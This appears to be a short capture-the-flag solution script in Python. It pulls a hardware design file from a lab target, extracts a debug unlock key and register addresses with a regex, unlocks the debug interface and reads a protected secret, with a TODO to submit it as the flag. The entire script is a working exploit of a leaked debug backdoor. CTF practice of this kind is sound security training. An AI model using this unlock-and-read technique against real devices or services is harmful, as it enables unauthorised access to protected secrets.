```python
import re, requests

BASE = "http://target:8110"
v = requests.get(f"{BASE}/design").text

def ex(name):
    return int(re.search(rf"{name}\s*=\s*\d+'h([0-9a-fA-F]+)", v).group(1), 16)

key  = ex("DBG_UNLOCK_KEY")
uadr = ex("DBG_UNLOCK_ADDR")
sadr = ex("DBG_SECRET_ADDR")

requests.post(f"{BASE}/debug/write", json={"addr": f"{uadr:02X}", "value": f"{key:08X}"})
r = requests.post(f"{BASE}/debug/read", json={"addr": f"{sadr:02X}"})
secret = r.json()["value"]
# TODO: POST /flag {"secret": secret}
```
